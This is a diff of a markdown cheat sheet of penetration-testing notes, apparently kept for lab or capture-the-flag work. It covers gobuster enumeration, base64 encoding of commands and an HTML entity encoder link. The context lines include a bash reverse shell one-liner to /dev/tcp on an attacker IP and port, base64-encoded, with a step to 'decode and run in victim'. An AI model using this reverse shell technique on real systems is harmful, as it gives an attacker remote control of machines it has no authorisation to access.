@@ -11,9 +11,6 @@
 
     ``` -x php ```can add filetype here
 
-
-
-
 ### Gobuster enum API
 - Provide pattern in pattern file
     ``` {GOBUSTER}/v1 ```
@@ -208,3 +205,7 @@ $cli_runner = new CLI_Runner();
 ## Base64 encode and decode a one liner
 1. ``` echo -n "bash -c 'bash -i >& /dev/tcp/10.10.10.10/9001 0>&1'" | base64 ``` encode
 2. ``` echo -n {base64encoded} | base64 -d | bash``` decode and run in victim
+
+## HTML entity encoder
+- https://mothereff.in/html-entities 
+- e.g. for java <xml>
